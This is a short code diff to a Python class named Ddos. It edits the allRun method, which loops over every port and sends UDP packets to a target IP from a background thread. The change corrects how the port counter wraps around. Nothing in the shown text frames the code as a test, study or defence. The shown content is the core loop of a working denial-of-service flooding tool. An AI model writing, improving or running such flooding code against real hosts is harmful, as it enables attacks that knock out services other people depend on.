@@ -56,11 +56,11 @@ class Ddos:
     def allRun(self):
         self.data['port'] = self.port
         while self.start:
+            if self.data['port'] > 65535:
+                self.data['port'] = 0
             self.sock.sendto(self.bytes, (self.ip,self.data['port']))
             self.data['sent'] += 1
             self.data['port'] += 1
-            if self.data['port'] == 65534:
-                self.data['port'] = 1
     def all(self):
         self.start = True
         t = threading.Thread(target=self.allRun, args=())
